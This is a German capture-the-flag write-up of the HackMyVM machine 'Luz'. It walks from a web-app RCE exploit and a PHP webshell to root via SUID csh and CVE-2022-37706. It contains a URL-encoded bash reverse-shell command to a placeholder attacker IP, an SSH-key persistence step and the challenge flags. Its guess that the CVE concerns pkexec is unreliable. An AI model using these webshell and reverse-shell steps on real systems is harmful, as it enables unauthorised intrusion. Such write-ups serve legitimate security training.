# Luz - HackMyVM (Easy)

![Luz.png](Luz.png)

## Übersicht

*   **VM:** Luz
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Luz)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2023-04-07
*   **Original-Writeup:** https://alientec1908.github.io/Luz_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Luz" zu erlangen. Der initiale Zugriff erfolgte durch Ausnutzung einer bekannten RCE-Schwachstelle (Exploit-DB 50305) in einem "Online Food Ordering System V2", das auf dem Webserver lief. Dies führte zu einer Webshell als `www-data`. Durch das Ausnutzen einer SUID/SGID-Fehlkonfiguration der `bsd-csh`-Shell konnte zu den effektiven Rechten des Benutzers `aelis` gewechselt werden. In diesem Kontext wurde ein Exploit-Skript (`ss.sh`) gefunden und ausgeführt, das eine bekannte Schwachstelle (CVE-2022-37706) ausnutzte, um Root-Rechte zu erlangen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wfuzz`
*   Python3 (Exploit-Skript, Shell-Stabilisierung)
*   `nc` (netcat)
*   `bash`
*   `pty` (Python-Modul)
*   `stty`
*   `sudo` (versucht)
*   `find`
*   `ss`
*   `csh` (bsd-csh)
*   `ssh`
*   `./ss.sh` (Exploit Script für CVE-2022-37706)
*   Standard Linux-Befehle (`ls`, `cat`, `grep`, `echo`, `id`, `cd`, `whoami`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Luz" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.120) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 8.9p1) und Port 80 (HTTP, Nginx 1.18.0). Das `PHPSESSID`-Cookie hatte das `httponly`-Flag nicht gesetzt.
    *   `gobuster` fand diverse PHP-Dateien (`index.php`, `login.php`, `signup.php`, etc.) und Verzeichnisse wie `/admin/` und `/database/`.
    *   `wfuzz` auf `index.php` fand den GET-Parameter `page`, der auf eine LFI-Schwachstelle hindeutete (dieser Vektor wurde im Bericht nicht weiterverfolgt).

2.  **Initial Access (RCE via Exploit-DB 50305 als `www-data`):**
    *   Recherche nach "Online Food Ordering System V2" führte zum Exploit `exploit-db.com/exploits/50305` (Unauthenticated RCE).
    *   Das Python-Exploit-Skript wurde ausgeführt (`python3 system_2.0.py http://192.168.2.120/`).
    *   Der Exploit lud eine PHP-Shell (`shell.php`) in `/var/www/html/fos/assets/img/` hoch.
    *   Über die Webshell wurde eine weitere einfache PHP-Webshell (`rev.php`) erstellt, die Befehle über den GET-Parameter `cmd` annimmt.
    *   Mittels `rev.php` wurde eine Bash-Reverse-Shell zu einem Netcat-Listener auf dem Angreifer-System gestartet (`http://192.168.2.120/assets/img/rev.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FANGREIFER_IP%2F9002%200%3E%261%27`).
    *   Die erhaltene Shell wurde als `www-data` stabilisiert.
    *   Die User-Flag (`HMVn03145n4nk4`) wurde in `/var/www/html/user.txt` gefunden.

3.  **Privilege Escalation (von `www-data` zu `aelis` via SUID/SGID `csh`):**
    *   `sudo -l` als `www-data` war nicht erfolgreich.
    *   Die Suche nach SUID-Dateien (`find / -type f -perm -4000 -ls`) fand `/usr/bin/bsd-csh` mit SUID- und SGID-Bits, die dem Benutzer `aelis` gehörte (`-rwsr-sr-x 1 aelis aelis ...`).
    *   Durch Ausführen von `/usr/bin/bsd-csh -b` (GTFOBins-Technik) wurden die effektiven Rechte auf `aelis` (`euid=1000(aelis) egid=1000(aelis)`) gewechselt.
    *   Ein öffentlicher SSH-Schlüssel des Angreifers wurde in `/home/aelis/.ssh/authorized_keys` platziert.
    *   Erfolgreicher SSH-Login als `aelis` mit dem entsprechenden privaten Schlüssel.

4.  **Privilege Escalation (von `aelis` zu `root` via CVE-2022-37706):**
    *   Im Verzeichnis `/tmp` wurde das Skript `ss.sh` gefunden.
    *   Ausführen von `./ss.sh` zeigte, dass es eine Schwachstelle (CVE-2022-37706, vermutlich in `pkexec` oder einer verwandten Komponente) ausnutzt.
    *   Das Skript lieferte eine Root-Shell (`uid=0(root)`).
    *   Die Root-Flag (`HMV3nl1gth3nm3n7`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Bekannte Webanwendungs-Schwachstelle (RCE):** Ausnutzung einer bekannten RCE-Schwachstelle (Exploit-DB 50305) in einer "Online Food Ordering System V2"-Anwendung.
*   **SUID/SGID Fehlkonfiguration (csh):** Eine C-Shell-Executable (`/usr/bin/bsd-csh`) hatte SUID/SGID-Bits gesetzt und gehörte einem normalen Benutzer (`aelis`), was eine Eskalation zu den Rechten dieses Benutzers ermöglichte.
*   **Lokale Privilegieneskalation durch Kernel/System-Schwachstelle (CVE-2022-37706):** Ausnutzung einer bekannten Schwachstelle (vermutlich im Zusammenhang mit `polkit`/`pkexec`) durch ein vorhandenes Exploit-Skript (`ss.sh`) zur Erlangung von Root-Rechten.
*   **Fehlendes `httponly`-Flag für Session-Cookies:** Ein potenzielles Risiko für Session-Hijacking über XSS (nicht ausgenutzt).
*   **Exponierte Datenbank-Dumps:** Ein SQL-Dump (`fos_db.sql`) mit Benutzerdaten und Passwort-Hashes wurde im Web-Root gefunden (nicht primär für den Exploit genutzt, aber ein Sicherheitsrisiko).

## Flags

*   **User Flag (`/var/www/html/user.txt`):** `HMVn03145n4nk4` (als `www-data` gefunden, aber Kontext ist `aelis`-Ebene)
*   **Root Flag (`/root/root.txt`):** `HMV3nl1gth3nm3n7`

## Tags

`HackMyVM`, `Luz`, `Easy`, `Web RCE`, `Exploit-DB 50305`, `SUID Exploit`, `SGID Exploit`, `csh`, `CVE-2022-37706`, `Linux`, `Privilege Escalation`, `Nginx`
